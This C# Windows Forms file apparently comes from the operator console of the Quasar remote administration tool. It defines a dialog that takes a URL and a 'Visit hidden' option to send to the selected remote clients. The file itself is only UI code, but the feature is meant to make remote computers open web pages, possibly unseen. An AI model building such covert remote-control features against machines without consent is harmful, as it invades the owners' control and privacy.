﻿using Quasar.Server.Forms.DarkMode;
using Quasar.Server.Helper;
using System;
using System.Windows.Forms;

namespace Quasar.Server.Forms
{
    public partial class FrmVisitWebsite : Form
    {
        public string Url { get; set; }
        public bool Hidden { get; set; }

        private readonly int _selectedClients;

        public FrmVisitWebsite(int selected)
        {
            _selectedClients = selected;
            InitializeComponent();

            DarkModeManager.ApplyDarkMode(this);
        }

        private void FrmVisitWebsite_Load(object sender, EventArgs e)
        {
            this.Text = WindowHelper.GetWindowTitle("Visit Website", _selectedClients);
        }

        private void btnVisitWebsite_Click(object sender, EventArgs e)
        {
            Url = txtURL.Text;
            Hidden = chkVisitHidden.Checked;

            this.DialogResult = DialogResult.OK;
            this.Close();
        }
    }
}